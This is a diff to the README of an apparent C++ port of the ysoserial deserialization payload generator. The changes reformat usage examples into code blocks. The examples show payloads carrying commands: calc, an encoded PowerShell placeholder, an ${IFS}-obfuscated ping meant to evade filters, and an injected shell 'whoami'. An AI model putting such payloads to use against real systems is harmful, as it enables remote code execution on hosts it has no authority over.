@@ -31,18 +31,36 @@ Implementation of object serializations an weaponizing in cpp similar functional
     * Build
     
      ```
+     
      g++ -std=c++17 -O2 -o ysoserial-cpp ysoserial.cpp
+
      ```
 
 
     * Payload inject execution commands abusing serialization
-        `./ysoserial-cpp templates "cmd /c calc"`
+        
+        ```
+        ./ysoserial-cpp templates "cmd /c calc"
+        ```
+        
     * Encoding
-        `./ysoserial-cpp object1 "powershell -enc <base64_command>"`
+    
+        ```
+        ./ysoserial-cpp object1 "powershell -enc <base64_command>"
+        ```
+        
     * Obfucation 
-        `./ysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"`
+
+        ```
+        ./ysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"
+        ```
+        
     * Inyecting ENV
-        `./ysoserial-cpp templates "\$SHELL -c 'whoami'"`
+        
+        ```
+        ./ysoserial-cpp templates "\$SHELL -c 'whoami'"
+        ```
+        
 
 
 
